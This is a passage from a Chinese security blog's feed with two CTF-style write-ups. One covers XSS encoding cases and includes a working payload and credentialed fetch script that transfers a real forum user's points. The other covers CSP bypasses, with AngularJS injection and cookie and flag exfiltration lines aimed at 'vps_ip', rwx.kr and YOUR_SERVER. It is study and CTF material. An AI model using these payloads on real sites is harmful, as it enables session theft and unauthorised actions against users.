</p><pre><code>javascript:%61%6c%65%72%74%28%32%29</code></pre><p>然后href丢给URL模块解析，得到</p><pre><code>javascript:alert(2)</code></pre><p>可以执行</p><h4 id="3-协议被编码，同1"><a href="#3-协议被编码，同1" class="headerlink" title="3 协议被编码，同1"></a>3 协议被编码，同1</h4><pre><code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code></pre><h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><pre><code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code></pre><p>无法执行，因为从HTML解析机制看，在读取<code>&lt;div&gt;</code>之后进入数据状态，<code>&amp;#60;</code>会被HTML解码，但不会进入标签开始状态，当然也就不会创建<code>img</code>元素，也就不会执行</p><h4 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h4><pre><code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</code></pre><p>无法执行，<code>&lt;textarea&gt;</code>是<code>RCDATA</code>元素（RCDATA elements），可以容纳文本和字符引用，注意<strong>不能容纳其他元素</strong>，HTML解码得到</p><pre><code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code></pre><h4 id="6-同5-无法执行"><a href="#6-同5-无法执行" class="headerlink" title="6  同5 无法执行"></a>6  同5 无法执行</h4><pre><code>&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</code></pre><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><pre><code>&lt;button onclick=&quot;confirm(&#39;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;</code></pre><p>这里<code>onclick</code>中为标签的属性值（类比2中的<code>href</code>），会被HTML解码，得到</p><pre><code>&lt;button onclick=&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;/button&gt;</code></pre><p>然后被执行</p><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><pre><code> &lt;button onclick=&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;/button&gt;</code></pre><p><code>onclick</code>中的值会交给JS处理，在JS中只有字符串和<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier" target="_blank" rel="noopener">标识符</a>能用Unicode表示，<code>&#39;</code>显然不行，JS执行失败</p><h4 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h4><pre><code> &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</code></pre><p>无法执行</p><p><code>script</code>属于原始文本元素(Raw text elements)，<strong>只可以容纳文本</strong>，注意<strong>没有字符引用</strong>，于是直接由JS处理，JS也认不出来，执行失败</p><p>原始文本元素(Raw text elements)有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p><h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</code></pre><p>这里js中可以使用Unicode的，只是有些特殊字符不能编码，可以执行</p><h4 id="11-同8，关键字符被编码"><a href="#11-同8，关键字符被编码" class="headerlink" title="11 同8，关键字符被编码"></a>11 同8，关键字符被编码</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;</code></pre><p>不能执行</p><h4 id="12-由于解码是字符串导致无法执行"><a href="#12-由于解码是字符串导致无法执行" class="headerlink" title="12 由于解码是字符串导致无法执行"></a>12 由于解码是字符串导致无法执行</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;</code></pre><p>这里看似将没毛病，但是这里<code>\u0031\u0032</code>在解码的时候会被解码为字符串<code>12</code>，注意是<strong>字符串</strong>，不是数字，文字显然是需要引号的，JS执行失败</p><p>这样就行了</p><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&quot;\u0031\u0032&quot;)&lt;/script&gt;</code></pre><h4 id="14-同8无法执行"><a href="#14-同8无法执行" class="headerlink" title="14 同8无法执行"></a>14 同8无法执行</h4><pre><code> &lt;script&gt;alert(&#39;13\u0027)&lt;/script&gt;</code></pre><h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><pre><code> &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt;</code></pre><p>html解码，得到</p><pre><code> javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code></pre><p>href识别出是JavaScript协议，URL解码得到</p><pre><code> javascript:\u0061\u006c\u0065\u0072\u0074(15)</code></pre><p>可以执行</p><p>总结</p><ol><li><script>和<style>数据只能有文本，不会有HTML解码和URL解码操作</li><li><code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>里会有HTML解码操作，但不会有子元素</li><li>其他元素数据（如<code>div</code>）和元素属性数据（如<code>href</code>）中会有HTML解码操作</li><li>部分属性（如<code>href</code>）会有URL解码操作，但URL中的协议需为ASCII</li><li>JavaScript会对字符串和标识符Unicode解码</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="tools网站markdown渲染导致xss"><a href="#tools网站markdown渲染导致xss" class="headerlink" title="tools网站markdown渲染导致xss"></a>tools网站markdown渲染导致xss</h3><p><a href="https://www.hackersb.cn/hacker/235.html" target="_blank" rel="noopener">参考</a></p><p>JavaScript伪协议直接弹框</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874638329.png" alt="img"></p><p>Discuz的每一步操作都需要 formhash,获取到这个值之后就可以了</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874680248.png" alt="img"></p><p>使用图片来触发xss</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874701778.png" alt="img"></p><p>最后的payload</p><pre><code> ![头像&quot; onload=alert(1);//](https://www.t00ls.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg)</code></pre><p>之后编写js代码来偷走tubi，</p><pre><code> var formhash = document.getElementsByName(&#39;formhash&#39;)[0].value; fetch(&quot;https://www.t00ls.net/misc.php?action=userrate&amp;userratesubmit=yes&amp;infloat=yes&amp;inajax=1&amp;inajax=1&quot;, {   method: &quot;POST&quot;,   credentials: &quot;include&quot;,   headers: {     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,     &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,     &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,     &quot;Connection&quot;: &#39;keep-alive&#39;,   },   body: &quot;formhash=&quot; + formhash + &quot;&amp;tid=39705&amp;do=dashang&amp;handlekey=userrate&amp;score=%2B10&amp;reason=thanks&quot; }).then(function(res) {   if (res.ok) {     alert(&quot;谢谢你的10Tubi！！！&quot;);   } }, function(e) {   alert(&quot;Error submitting form!&quot;); });</code></pre><p>然后插入图片，引用这个js即可</p></script></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;XSS挑战&quot;&gt;&lt;a href=&quot;#XSS挑战&quot; class=&quot;headerlink&quot; title=&quot;XSS挑战&quot;&gt;&lt;/a&gt;XSS挑战&lt;/h2&gt;&lt;p&gt;(突然发现这个平台有bug，只需要在控制台alert(1)即可。。)&lt;/p&gt;
&lt;h3 id=&quot;level1&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="XSS" scheme="http://prontosil.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>绕过CSP</title>
    <link href="http://prontosil.com/posts/1e1d8fb4/"/>
    <id>http://prontosil.com/posts/1e1d8fb4/</id>
    <published>2020-03-10T07:10:40.000Z</published>
    <updated>2020-03-10T07:16:09.097Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><table><thead><tr><th><code>default-src</code></th><th><code>&#39;self&#39; cdn.example.com</code></th><th>定义资源默认加载策略</th></tr></thead><tbody><tr><td><code>script-src</code></td><td><code>&#39;self&#39; js.example.com</code></td><td>定义 JS 加载策略</td></tr><tr><td><code>style-src</code></td><td><code>&#39;self&#39; css.example.com</code></td><td>定义 CSS 加载策略</td></tr><tr><td><code>img-src</code></td><td><code>&#39;self&#39; img.example.com</code></td><td>定义图片加载策略</td></tr><tr><td><code>connect-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td><code>font-src</code></td><td><code>font.example.com</code></td><td>定义 Font 加载策略</td></tr><tr><td><code>object-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 、、 等引用资源加载策略</td></tr><tr><td><code>media-src</code></td><td><code>media.example.com</code></td><td>定义</td></tr><tr><td><code>frame-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Frame 加载策略</td></tr><tr><td><code>sandbox</code></td><td><code>allow-forms allow-scripts</code></td><td>对页面的操作应用限制，包括阻止弹出窗口，阻止插件和脚本的执行以及强制执行同源策略。可以不设置sanbox的值使得所有限制启用，或者手动启用以下属性 : <code>allow-forms</code> <code>allow-same-origin</code> <code>allow-scripts</code> <code>allow-popups</code>, <code>allow-modals</code>, <code>allow-orientation-lock</code>, <code>allow-pointer-lock</code>, <code>allow-presentation</code>, <code>allow-popups-to-escape-sandbox</code>, and <code>allow-top-navigation</code></td></tr><tr><td><code>report-uri</code></td><td><code>/some-report-uri</code></td><td>指定浏览器报告策略错误的URL，可以在HTTP头中添加<code>-Report-Only</code> 来指示浏览器只报告不阻断</td></tr><tr><td><code>child-src</code></td><td><code>&#39;self&#39;</code></td><td>child-src指令管理了套嵌浏览的部分（类似于iframe、frame标签）</td></tr><tr><td><code>form-action</code></td><td><code>&#39;self&#39;</code></td><td>定义了form表单中action的范围</td></tr><tr><td><code>frame-ancestors</code></td><td><code>&#39;none&#39;</code></td><td>定义<code>&lt;frame&gt;</code> <code>&lt;iframe&gt;</code> <code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> <code>&lt;applet&gt;</code>加载策略. 直接设置<code>‘none’</code> 几乎等于设置了<code>X-Frame-Options: DENY</code></td></tr><tr><td><code>plugin-types</code></td><td><code>application/pdf</code></td><td>设置有效的MIME类型</td></tr></tbody></table><h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><h3 id="使用CDN绕过"><a href="#使用CDN绕过" class="headerlink" title="使用CDN绕过"></a>使用CDN绕过</h3><p>一般来说，前端会用到许多的前端框架和库，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险</p><p>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP</p><pre><code class="html">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-eval&#39; https://cdnjs.cloudflare.com;&quot;&gt;&lt;!-- foo=&quot;--&gt;&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app&gt;    {{constructor.constructor('alert(document.cookie)')()}}&lt;/div&gt;</code></pre><p><a href="https://github.com/hackmdio/codimd/pull/1112/commits/067cfe2d1eedc5a58e5548785858e38fbaa0e84b" target="_blank" rel="noopener">修复</a></p><p><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">orange师傅的文章</a></p><p>利用条件:</p><ol><li>CDN服务商存在某些低版本的js库</li><li>此CDN服务商在CSP白名单中</li></ol><h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>通过页面跳转功能来实现</p><pre><code>location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</code></pre><h3 id="link标签绕过-比较老了"><a href="#link标签绕过-比较老了" class="headerlink" title="link标签绕过(比较老了)"></a>link标签绕过(比较老了)</h3><pre><code>&lt;!-- firefox --&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//${cookie}.vps_ip&quot;&gt;&lt;!-- chrome --&gt;&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?${cookie}&quot;&gt;</code></pre><p>带外数据的写法</p><pre><code class="js">var link = document.createElement(&quot;link&quot;);link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);document.head.appendChild(link);</code></pre><p>使用条件：</p><p>k可以执行任意的js脚本，但是无法带外数据</p><h3 id="iframe绕过"><a href="#iframe绕过" class="headerlink" title="iframe绕过"></a>iframe绕过</h3><blockquote><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</p></blockquote><h3 id="jsonp绕过"><a href="#jsonp绕过" class="headerlink" title="jsonp绕过"></a>jsonp绕过</h3><p><a href="https://github.com/google/csp-evaluator/tree/master/whitelist_bypasses" target="_blank" rel="noopener">收集</a></p><h2 id="CSP绕过实例"><a href="#CSP绕过实例" class="headerlink" title="CSP绕过实例"></a>CSP绕过实例</h2><h3 id="BSidesSF-2020-csp-1"><a href="#BSidesSF-2020-csp-1" class="headerlink" title="BSidesSF 2020 csp-1"></a>BSidesSF 2020 csp-1</h3><p>csp如下，<code>script-src</code> 支持 data</p><pre><code class="j">content-security-policy:     script-src &#39;self&#39; data:;     default-src &#39;self&#39;;     connect-src *;     report-uri /csp_report</code></pre><p>可以使用 <code>fetch</code> (js实在是不熟悉)</p><p>payload-1</p><pre><code>&lt;script src=&quot;data:,fetch(&#39;/csp-one-flag&#39;).then(x=&gt;x.text()).then(x=&gt;location=&#39;http://rwx.kr/?&#39;+escape(x))&quot;&gt;</code></pre><p>或者编码也是可以的</p><pre><code>// NOTE:// &quot;ZmV0Y...&quot; is base64 encoded text of this script.// fetch(&quot;https://csp-1-5aa1f221.challenges.bsidessf.net/csp-one-flag&quot;).then(r=&gt;r.text()).then(t=&gt;fetch(&quot;YOUR_SERVER&quot;+t))&lt;script src=&quot;data:text/javascript;base64,ZmV0Y2goImh0dHBzOi8vY3NwLTEtNWFhMWYyMjEuY2hhbGxlbmdlcy5ic2lkZXNzZi5uZXQvY3NwLW9uZS1mbGFnIikudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT5mZXRjaCgiWU9VUl9TRVJWRVIiK3QpKQ==&quot;&gt;&lt;/script&gt;</code></pre><h3 id="csp-2"><a href="#csp-2" class="headerlink" title="csp-2"></a>csp-2</h3><pre><code>Content-Security-Policy: script-src &#39;self&#39; ajax.googleapis.com &#39;unsafe-eval&#39;; default-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src *; report-uri /csp_report</code></pre><p>看到了 <code>ajax.googleapis.com</code> 在白名单中，可以使用其提供的angularjs的模板注入来绕过</p><pre><code class="html">&lt;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app ng-csp&gt;{{constructor.constructor('eval(atob("ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp"))')()}}&lt;/div&gt;</code></pre><p>payload2</p><pre><code class="js">&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js&quot;&gt;&lt;/script&gt; &lt;div class=&quot;ng-app&quot;&gt; {{ constructor.constructor('fetch("https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))')() }} &lt;/div&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;code&gt;default-src&lt;/code&gt;&lt;/th&gt;
&lt;th&gt;&lt;code&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="CSP" scheme="http://prontosil.com/tags/CSP/"/>
    
  </entry>
  
</feed>
